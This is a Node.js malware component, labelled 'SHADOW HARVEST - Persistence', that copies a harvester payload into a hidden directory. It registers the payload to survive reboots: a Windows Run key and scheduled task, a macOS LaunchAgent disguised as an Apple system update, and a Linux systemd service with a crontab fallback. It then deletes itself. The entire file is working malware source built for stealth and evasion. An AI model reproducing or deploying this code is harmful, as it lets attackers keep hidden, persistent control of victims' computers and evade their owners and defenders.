#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - Persistence
// Ensures the harvester survives reboots
// ============================================

const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

const platform = os.platform();
const home = os.homedir();
const payloadPath = path.join(os.tmpdir(), ".system_update.js");

function createHiddenDir() {
  const hiddenDir = path.join(home, ".cache", ".system");
  fs.mkdirSync(hiddenDir, { recursive: true });
  return hiddenDir;
}

function windowsPersistence() {
  const hiddenDir = createHiddenDir();
  const targetPath = path.join(hiddenDir, "system_update.js");
  fs.copyFileSync(payloadPath, targetPath);

  // Registry Run key
  const regCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "node ${targetPath}" /f`;
  try { execSync(regCommand, { windowsHide: true }); } catch (e) {}

  // Scheduled task (hourly)
  const taskCommand = `schtasks /create /tn "SystemUpdate" /tr "node ${targetPath}" /sc hourly /mo 1 /f`;
  try { execSync(taskCommand, { windowsHide: true }); } catch (e) {}
}

function macPersistence() {
  const hiddenDir = createHiddenDir();
  const targetPath = path.join(hiddenDir, "system_update.js");
  fs.copyFileSync(payloadPath, targetPath);

  const plistPath = path.join(home, "Library", "LaunchAgents", "com.apple.SystemUpdate.plist");
  const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
  <plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.apple.SystemUpdate</string>
    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/bin/node</string>
      <string>${targetPath}</string>
    </array>
    <key>StartInterval</key>
    <integer>3600</integer>
    <key>RunAtLoad</key>
    <true/>
  </dict>
  </plist>`;

  fs.writeFileSync(plistPath, plistContent);
  try { execSync(`launchctl load "${plistPath}"`, { stdio: "ignore" }); } catch (e) {}
}

function linuxPersistence() {
  const hiddenDir = createHiddenDir();
  const targetPath = path.join(hiddenDir, "system_update.js");
  fs.copyFileSync(payloadPath, targetPath);

  // systemd user service
  const serviceDir = path.join(home, ".config", "systemd", "user");
  fs.mkdirSync(serviceDir, { recursive: true });
  const servicePath = path.join(serviceDir, "system-update.service");
  const serviceContent = `[Unit]
  Description=System Update Service
  [Service]
  ExecStart=/usr/bin/node ${targetPath}
  Restart=always
  RestartSec=60
  [Install]
  WantedBy=default.target`;
  fs.writeFileSync(servicePath, serviceContent);
  try { execSync(`systemctl --user enable system-update.service`, { stdio: "ignore" }); } catch (e) {}
  try { execSync(`systemctl --user start system-update.service`, { stdio: "ignore" }); } catch (e) {}

  // crontab fallback
  const cronLine = `*/30 * * * * /usr/bin/node ${targetPath}`;
  try {
    const currentCron = execSync("crontab -l 2>/dev/null").toString();
    if (!currentCron.includes("system_update")) {
      execSync(`(crontab -l 2>/dev/null; echo "${cronLine}") | crontab -`);
    }
  } catch (e) {
    try { execSync(`echo "${cronLine}" | crontab -`); } catch (e2) {}
  }
}

// Main
if (platform === "win32") {
  windowsPersistence();
} else if (platform === "darwin") {
  macPersistence();
} else if (platform === "linux") {
  linuxPersistence();
}

// Self-destruct
fs.unlinkSync(__filename);
